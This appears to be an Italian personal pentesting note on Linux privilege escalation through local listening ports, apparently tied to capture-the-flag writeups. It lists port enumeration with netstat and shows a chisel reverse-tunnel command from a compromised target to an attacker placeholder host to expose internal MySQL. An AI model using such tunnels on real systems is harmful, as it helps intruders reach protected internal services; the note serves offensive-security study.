#Privesc_Linux

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Port Forwarding]]
	1. [[#Chisel]]
	2. [[#SSH]]

---
---
---
### Introduzione
Durante una fase di post-exploitation o privilege escalation, **le porte in ascolto locali** rappresentano un importante vettore di attacco.  
Molti servizi su porte aperte (soprattutto se vincolati a `127.0.0.1`) **non richiedono autenticazione**, **girano come root** o **espongono funzionalitÃ  sensibili**.  
Analizzare questi servizi puÃ² rivelare:
- socket non autenticati
- interfacce RPC/debug
- servizi interni
- API non protette
- interpreti remoti (`bash`, `sh`, `python`)
- upload point o cron API

---
### Enumerazione delle Porte in Ascolto
Per elencare tutte le porte TCP/UDP in ascolto (anche solo locali):

```
netstat -tunl
```

ðŸ“šâ€‹ Writeups:
- [[Linux#OpenAdmin| OpenAdmin]],[[Linux#Luane| Luane]],[[Linux#Nineveh| Nineveh]],

---
### Port Forwarding
#### Chisel
Il **port forwarding** Ã¨ una tecnica che permette di accedere a servizi interni non esposti pubblicamente, inoltrando il traffico attraverso una macchina compromessa.  
Uno degli strumenti piÃ¹ versatili in ambito offensivo Ã¨ [chisel](https://github.com/jpillora/chisel), un tunnel usato per bypassare restrizioni di rete e creare connessioni.

 Chisel Ã¨ utile per:
- accedere a porte in ascolto su `127.0.0.1` del target;
- bypassare firewall e restrizioni NAT;
- creare canali per SSH, Redis, RDP, API interne.

Esempio di **port forwarding** (dal target verso l'attaccante):

```
chisel server --reverse -p 8000                                  #Attaccante (listener)  
chisel client <ATTACKER_IP>:8000 R:localhost:3306:127.0.0.1:3306 #Target (client reverse)
```

> In questo esempio, la porta `3306` (MySQL) sul target diventa accessibile in locale sulla macchina dell'attaccante tramite `localhost:3306`.

ðŸ“šâ€‹ Writeups:
- [[Linux#Horizontall| Horizontall]],[[Linux#Build| Build]],[[Linux#Zab| Zab]],[[Linux#PC| PC]],
#### SSH
Consultare[[SSH#Port forwarding | port forwarding SSH]].